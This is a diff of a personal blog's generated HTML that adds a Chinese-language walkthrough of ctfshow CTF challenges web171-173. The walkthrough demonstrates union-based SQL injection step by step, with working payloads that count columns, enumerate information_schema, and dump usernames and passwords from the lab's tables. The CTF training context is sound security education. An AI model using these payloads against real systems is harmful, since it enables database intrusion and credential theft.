@@ -145,7 +145,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87(%E4%B8%80)[78-81]/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/06/ctfshow-web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5%E7%AF%87[171-]/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -159,7 +159,116 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87(%E4%B8%80)%5B78-81%5D/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2025/02/06/ctfshow-web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5%E7%AF%87%5B171-%5D/" class="post-title-link" itemprop="url">SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-02-06 13:32:37 / Modified: 20:08:54" itemprop="dateCreated datePublished" datetime="2025-02-06T13:32:37+08:00">2025-02-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>web171</strong></p>
+<p>先利用单引号1’测试回显发现错误</p>
+<p>再利用–+测试回显正常</p>
+<p>然后利用<strong>order by</strong>测试字段数</p>
+<p>最后得到字段数为3</p>
+<pre><code>1&#39; order by 3 --+   (通过修改数字判断字段数)
+</code></pre>
+<p>利用语句查询基础资料</p>
+<pre><code>0&#39; union select database(),user(),version()--+
+</code></pre>
+<p><img src="https://www.helloimg.com/i/2025/02/06/67a45e2414750.png"></p>
+<p>查询<strong>ctfshow_web</strong>数据库下的表   2,3是占位符</p>
+<pre><code>0&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--+
+</code></pre>
+<img title src="https://www.helloimg.com/i/2025/02/06/67a45daa6414c.png" alt style="zoom:33%;">
+
+<p>查询列名</p>
+<pre><code>0&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_schema=&#39;ctfshow_web&#39;and table_name=&#39;ctfshow_user&#39;--+
+</code></pre>
+<p><img src="https://www.helloimg.com/i/2025/02/06/67a45e6f970d7.png"></p>
+<p>最后查询所有列的数据</p>
+<pre><code>  0&#39; union select id,username,password from ctfshow_web.ctfshow_user--+
+</code></pre>
+<img src="https://www.helloimg.com/i/2025/02/06/67a465d3cd207.png" title alt style="zoom:33%;">
+
+<p><strong>web172</strong></p>
+<p>前面的步骤和<strong>web171</strong>一样   但是这个只有两个回显</p>
+<p>并且他添加了一个新规则</p>
+<p><img src="https://www.helloimg.com/i/2025/02/06/67a47c0615127.png"></p>
+<p>并且因为只有两个回显  所以在最后一步要删去username</p>
+<p>即构造:</p>
+<pre><code> 0&#39; union select id,password from ctfshow_web.ctfshow_user2--+
+</code></pre>
+<img src="https://www.helloimg.com/i/2025/02/06/67a47c5b382a3.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+<p><strong>web173</strong></p>
+<p>一样一样和前面一样</p>
+<p>但是不同点有三个字段</p>
+<p>并且flag在第三个表内(ctfshow_web.ctfshow_user3)   且和上一题一样不能用username  用2替代</p>
+<p>构造:</p>
+<pre><code> 0&#39; union select id,2,password from ctfshow_web.ctfshow_user3--+
+</code></pre>
+<p><img src="https://www.helloimg.com/i/2025/02/06/67a49d6e4ab63.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87[78-81]/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87%5B78-81%5D/" class="post-title-link" itemprop="url">Untitled</a>
         </h2>
 
         <div class="post-meta">
@@ -1236,7 +1345,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
